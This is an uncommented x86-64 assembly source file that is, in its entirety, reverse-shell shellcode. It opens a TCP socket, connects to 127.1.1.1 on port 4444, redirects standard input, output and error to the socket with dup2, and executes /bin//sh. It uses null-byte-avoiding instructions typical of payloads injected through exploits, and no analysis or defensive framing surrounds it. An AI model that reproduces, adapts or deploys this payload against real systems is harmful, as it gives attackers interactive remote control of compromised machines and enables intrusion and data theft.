global _start

_start:

	mov al, 41
	xor rdi, rdi
	add rdi, 2
	xor rsi, rsi
	add rsi, 1
	xor rdx, rdx
	syscall

	mov rdi, rax

	xor rax, rax

	push rax

	mov dword [rsp - 4], 0x0101017f
	mov word [rsp - 6], 0x5c11
	mov byte [rsp - 8], 0x2
	sub rsp, 8

	add rax, 42
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	syscall

	xor rax, rax	
	add rax, 33
	xor rsi, rsi
	syscall

	xor rax, rax
	add rax, 33
	add rsi, 1
	syscall

	xor rax, rax
	add rax, 33
	add rsi, 1
	syscall

	xor rax, rax
	push rax

	mov rbx, 0x68732f2f6e69622f
	push rbx

	mov rdi, rsp

	push rax

	mov rdx, rsp

	push rdi
	
	mov rsi, rsp

	add rax, 59
	syscall
